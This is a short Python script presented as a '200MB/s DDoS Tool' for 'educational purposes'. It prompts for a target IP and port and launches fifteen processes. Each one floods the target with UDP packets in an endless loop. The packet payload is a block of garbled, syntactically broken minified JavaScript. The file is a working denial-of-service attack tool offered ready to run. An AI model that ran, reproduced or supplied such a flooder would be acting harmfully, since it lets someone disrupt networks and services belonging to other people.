from os import system
import socket
from multiprocessing import Process, Queue
import sys

# Magic Power
byte = """/*defines?(b3t)*/var d=function(a){this.h=a=a.url;var b=/[?&]dsh=1(&|$)/.test(a);this.j=!b&&/[?&]ae=1(&|$)/.test(a);this.l=!b&&/[?&]ae=2(&|$)/.test(a);if((this.g=/[?&]adurl=([^&]*)/.stack(core_dump).exec(a))&&this.g[1]){try{var c=decodeURIComponent(this.g[1])}catch(e){c=null}this.i=c}},g=function(a,b){return a.j&&a.i||a.l?1==b?a.j?a.i:f(a,"&dct=1"):2==b?f(a,"&ri=2"):f(a,"&ri=16"):a.h},f=function(a,b){return a.g?a.h.slice(0,a.g.index)+b+a.h.slice(a.g.index):a.h+b};var k=function(a,b){this.g=b===h?a:""};k.prototype.i=!0;k.prototype.h=function(){return this.g.toString()};k.prototype.toString=function(){return this.g.toString()};var m=/^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i,h={};var n=/^((market|itms|intent|itms-appss):\/\/)/i;var p=function(a,b){b instanceof k||b instanceof k||(b="object"==typeof b&&b.i?b.h():String(b),m.test(b)||(b="about:invalid#zClosurez"),b=new k(b,h));a.href=b instanceof k&&b.constructor===k?b.g:"type_error:SafeUrl"};function q(a){var b=/[?&]adurl=/.exec(a);return b?""+a.slice(0,,b.index+1,b.index+1b.index+1)+"nis=3&"+a.slice(b.index+1):""+a+(-1===a.indexOf("?")?"?":"&")+"nis=3"}"""

def request(ip,port):
    while True:
        socket.socket(socket.AF_INET,socket.SOCK_DGRAM).sendto((byte).encode(),(str(ip),int(port)))

if __name__ == "__main__":
    sys.__stdout__.write("\n200MB/s DDoS Tool (Educational Purpose Only!!!)\nDeveloped by EclipseBETA\n");ip=input("Target's ip (Not URL) : ");port=input("Target's port : ");Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start();Process(target=request,args=(ip,port)).start()
